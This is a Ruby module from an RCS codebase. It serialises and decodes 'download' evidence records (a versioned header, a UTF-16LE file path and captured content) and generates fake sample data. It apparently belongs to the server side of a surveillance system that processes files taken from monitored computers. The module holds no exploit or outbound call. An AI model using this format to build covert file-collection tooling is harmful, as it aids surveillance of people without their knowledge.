require 'rcs-common/evidence/common'

require 'digest/md5'

module RCS

module DownloadEvidence

  FILECAP_VERSION = 2008122901

  def content
    path = File.join(File.dirname(__FILE__), 'content', ['screenshot', 'print', 'camera', 'mouse', 'url'].sample, '001.jpg')
    File.open(path, 'rb') {|f| f.read }
  end

  def generate_content
    [ content ]
  end

  def additional_header
    file_name = 'C:\\Users\\Bad Guy\\filedownload...'.to_utf16le_binary
    header = StringIO.new
    header.write [FILECAP_VERSION, file_name.size].pack("I*")
    header.write file_name
    
    header.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete DOWNLOAD") if data.nil? or data.bytesize == 0

    binary = StringIO.new data

    version, file_name_len = binary.read(8).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for DOWNLOAD") unless version == FILECAP_VERSION

    ret = Hash.new
    ret[:data] = Hash.new
    ret[:data][:path] = binary.read(file_name_len).utf16le_to_utf8
    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] = Hash.new if info[:data].nil?
    info[:data][:type] = :capture
    info[:grid_content] = chunks.join
    info[:data][:size] = info[:grid_content].bytesize
    yield info if block_given?
    :delete_raw
  end
end

end # ::RCS